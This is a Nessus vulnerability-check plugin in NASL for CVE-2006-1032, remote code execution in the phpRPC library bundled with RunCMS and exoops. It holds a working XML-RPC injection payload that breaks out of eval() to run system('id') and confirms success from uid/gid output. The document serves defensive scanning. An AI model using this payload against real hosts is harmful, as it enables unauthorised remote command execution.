#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20986);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2006-1032");
  script_bugtraq_id(16833);
  script_osvdb_id(23514);

  script_name(english:"phpRPC Library rpc_decoder.php decode() Function Arbitrary Code Execution");
  script_summary(english:"Checks for remote code execution in phpRPC library");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP library that is prone to
arbitrary code execution." );
 script_set_attribute(attribute:"description", value:
"The remote host has installed on it the phpRPC library, an xmlrpc
library written in PHP and bundled with applications such as RunCMS
and exoops. 

The version of phpRPC on the remote host fails to sanitize user input
to the 'server.php' script before using it in an 'eval()' function,
which may allow for remote code to be executed on the affected host
subject to the privileges of the web server userid. 

Note that successful exploitation may require that the phpRPC library
be enabled in, say, RunCMS, which is not necessarily the default." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00105-02262006" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/426193/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Disable or remove the affected library." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/02/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/26");
 script_cvs_date("$Date: 2015/09/24 23:21:20 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "no404.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (get_kb_item("www/no404/"+port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/runcms", "/exoops", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Check whether the script exists.
  #
  # nb: both RunCms and exoops use this.
  url = string(dir, "/modules/phpRPC/server.php");
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);

  # If it does...
  #
  # nb: the script only responds to POSTs.
  if (r[0] =~ "^HTTP/.* 200 ")
  {
    # Try to exploit the flaw to run a command.
    cmd = "id";
    postdata = string(
      '<?xml version="1.0"?>\n',
      "<methodCall>\n",
      "<methodName>test.method</methodName>\n",
      "  <params>\n",
      "    <param>\n",
      "      <value><base64>'));system(", cmd, ");exit;\n",
      "    </param>\n",
      "  </params>\n",
      "</methodCall>"
    );
    r = http_send_recv3(method:"POST", item: url, port: port,
      content_type: "text/xml", data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if we see the code in the XML debug output.
    if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)) {
      if (report_verbosity) {
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote host.\n",
          "It produced the following output :\n",
          "\n",
          res
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
